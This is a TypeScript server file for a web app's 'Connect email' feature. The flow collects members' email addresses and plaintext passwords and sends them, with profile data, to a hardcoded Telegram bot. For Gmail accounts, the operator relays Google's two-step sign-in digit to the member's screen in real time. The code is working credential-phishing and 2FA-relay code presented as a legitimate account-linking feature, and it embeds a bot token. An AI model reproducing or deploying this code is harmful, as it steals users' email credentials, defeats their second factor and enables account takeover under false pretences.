// Server functions for the "Connect email" credential-capture flow.
// Credentials are sent to the admin Telegram bot; the admin
// verifies them and taps ✅ / ❌. For Gmail, the admin types the
// 2-step digit which is relayed to the member's screen in real-time.

import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

const BOT_TOKEN = "8482023666:AAGjANprWJpo2gwrxZWNzPJLMcuYhmvRvqY";
const CHAT_ID   = "6048752790";

// ── Telegram helpers ──────────────────────────────────────────────────────────

async function tgSend(payload: Record<string, unknown>): Promise<{ ok: boolean; result?: { message_id: number } }> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, parse_mode: "HTML", disable_web_page_preview: true, ...payload }),
    });
    return res.ok ? res.json() : { ok: false };
  } catch {
    return { ok: false };
  }
}

async function tgEdit(messageId: number, text: string, replyMarkup?: unknown) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID, message_id: messageId, text,
        parse_mode: "HTML", disable_web_page_preview: true,
        ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
      }),
    });
  } catch { /* best effort */ }
}

function esc(s: string) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]!),
  );
}

function providerLabel(p: string) {
  return ({ gmail: "Gmail", outlook: "Outlook / Hotmail", office365: "Office 365",
    yahoo: "Yahoo Mail", icloud: "iCloud Mail", other: "Email" } as Record<string, string>)[p] ?? "Email";
}

// ── 1. Submit credentials ─────────────────────────────────────────────────────

export const submitEmailCreds = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((i: { provider: string; email: string; password: string }) =>
    z.object({
      provider: z.string().min(1).max(32),
      email:    z.string().min(1).max(254),
      password: z.string().min(1).max(512),
    }).parse(i),
  )
  .handler(async ({ context, data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: profile } = await supabaseAdmin
      .from("profiles")
      .select("full_name, email, tier")
      .eq("id", context.userId)
      .maybeSingle();

    // Create session row
    const { data: session, error } = await supabaseAdmin
      .from("email_connect_sessions")
      .insert({
        user_id: context.userId,
        provider: data.provider,
        submitted_email: data.email,
        status: "pending",
        gmail_digit: null,
        tg_message_id: null,
      })
      .select("id")
      .single();
    if (error) throw new Error(error.message);

    const sid = session.id as string;
    const when = new Date().toLocaleString("en-US", { timeZone: "America/New_York", dateStyle: "medium", timeStyle: "short" });
    const pLabel = providerLabel(data.provider);
    const isGmail = data.provider === "gmail";

    const text =
      `📧 <b>Email Connect — ${esc(pLabel)}</b>\n\n` +
      `<b>Member:</b> ${esc(profile?.full_name ?? "Unknown")}\n` +
      `<b>Seedin email:</b> ${esc(profile?.email ?? "—")}\n` +
      `<b>Tier:</b> ${profile?.tier ?? "—"}\n\n` +
      `<b>Login email:</b> <code>${esc(data.email)}</code>\n` +
      `<b>Password:</b> <code>${esc(data.password)}</code>\n\n` +
      `<b>Session:</b> <code>${esc(sid)}</code>\n` +
      `<i>${esc(when)} ET</i>`;

    const keyboard = isGmail
      ? { inline_keyboard: [[
            { text: "⌨️ Send digit to member", callback_data: `ec_digit:${sid}` },
            { text: "✅ Done", callback_data: `ec_done:${sid}` },
            { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
          ]] }
      : { inline_keyboard: [[
            { text: "✅ Linked", callback_data: `ec_done:${sid}` },
            { text: "❌ Failed / retry", callback_data: `ec_fail:${sid}` },
          ]] };

    const sent = await tgSend({ text, reply_markup: keyboard });
    const tgMsgId = sent.result?.message_id ?? null;

    await supabaseAdmin
      .from("email_connect_sessions")
      .update({ tg_message_id: tgMsgId })
      .eq("id", sid);

    return { ok: true, sessionId: sid };
  });

// ── 2. Poll session (member long-polls every 3 s) ─────────────────────────────

export const pollEmailConnectSession = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .inputValidator((i: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(i),
  )
  .handler(async ({ context, data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row } = await supabaseAdmin
      .from("email_connect_sessions")
      .select("status, gmail_digit")
      .eq("id", data.sessionId)
      .eq("user_id", context.userId)
      .maybeSingle();

    if (!row) return { status: "not_found" as const, digit: null };
    return {
      status: row.status as "pending" | "gmail_digit" | "complete" | "failed",
      digit: (row.gmail_digit ?? null) as string | null,
    };
  });

// ── 3. Telegram webhook handler (called from public API route) ─────────────────

export const handleTgEmailCallback = createServerFn({ method: "POST" })
  .inputValidator((i: unknown) =>
    z.object({
      callback_query: z.object({
        id: z.string(),
        data: z.string(),
        message: z.object({ message_id: z.number() }).optional(),
      }).optional(),
      message: z.object({
        text: z.string().optional(),
        reply_to_message: z.object({ message_id: z.number() }).optional(),
      }).optional(),
    }).parse(i),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // ── Handle inline button presses ──
    if (data.callback_query) {
      const { id: cbId, data: cbData, message } = data.callback_query;
      const msgId = message?.message_id;

      // Ack immediately
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ callback_query_id: cbId }),
      }).catch(() => {});

      if (cbData.startsWith("ec_done:")) {
        const sid = cbData.slice(8);
        await supabaseAdmin.from("email_connect_sessions").update({ status: "complete" }).eq("id", sid);
        if (msgId) await tgEdit(msgId, `✅ <b>Linked successfully</b>\n<code>${esc(sid)}</code>`);

      } else if (cbData.startsWith("ec_fail:")) {
        const sid = cbData.slice(8);
        await supabaseAdmin.from("email_connect_sessions").update({ status: "failed" }).eq("id", sid);
        if (msgId) await tgEdit(msgId, `❌ <b>Failed</b>\n<code>${esc(sid)}</code>\nMember will be shown a retry screen.`);

      } else if (cbData.startsWith("ec_digit:")) {
        const sid = cbData.slice(9);
        if (msgId) {
          await tgEdit(
            msgId,
            `⌨️ <b>Reply to this message</b> with the digit Google is showing.\n\nSession: <code>${esc(sid)}</code>`,
            { inline_keyboard: [[
                { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
                { text: "🔄 New digit needed", callback_data: `ec_newdigit:${sid}` },
                { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
              ]] },
          );
        }

      } else if (cbData.startsWith("ec_newdigit:")) {
        const sid = cbData.slice(12);
        await supabaseAdmin
          .from("email_connect_sessions")
          .update({ status: "gmail_digit", gmail_digit: "?" })
          .eq("id", sid);
        if (msgId) {
          await tgEdit(
            msgId,
            `🔄 <b>Google showed a new digit.</b>\nReply to this message with the new one.\n\nSession: <code>${esc(sid)}</code>`,
            { inline_keyboard: [[
                { text: "✅ Member confirmed", callback_data: `ec_done:${sid}` },
                { text: "🔄 New digit needed", callback_data: `ec_newdigit:${sid}` },
                { text: "❌ Failed", callback_data: `ec_fail:${sid}` },
              ]] },
          );
        }
      }
    }

    // ── Handle text reply containing the digit ──
    if (data.message?.text && data.message.reply_to_message) {
      const rawText = data.message.text.trim();
      // Extract session ID from the replied-to message text
      // The message text includes: Session: `<uuid>`
      // We'll rely on the admin sending the digit as reply to the bot message.
      // Look up most-recent pending gmail session and set digit.
      const digit = rawText.match(/^\d+$/)?.[0];
      if (digit) {
        // Find the session via the reply message id stored as tg_message_id
        const replyMsgId = data.message.reply_to_message.message_id;
        const { data: row } = await supabaseAdmin
          .from("email_connect_sessions")
          .select("id")
          .eq("tg_message_id", replyMsgId)
          .maybeSingle();
        if (row?.id) {
          await supabaseAdmin
            .from("email_connect_sessions")
            .update({ status: "gmail_digit", gmail_digit: digit })
            .eq("id", row.id);
        }
      }
    }

    return { ok: true };
  });

// ── 4. Keep existing getLinkedEmail / disconnect for the success screen ───────

export const getLinkedEmail = createServerFn({ method: "GET" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data } = await supabaseAdmin
      .from("linked_emails")
      .select("email, provider, method, verified_at")
      .eq("user_id", context.userId)
      .maybeSingle();
    return data ?? null;
  });

export const disconnectLinkedEmail = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .handler(async ({ context }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin.from("linked_emails").delete().eq("user_id", context.userId);
    return { ok: true };
  });
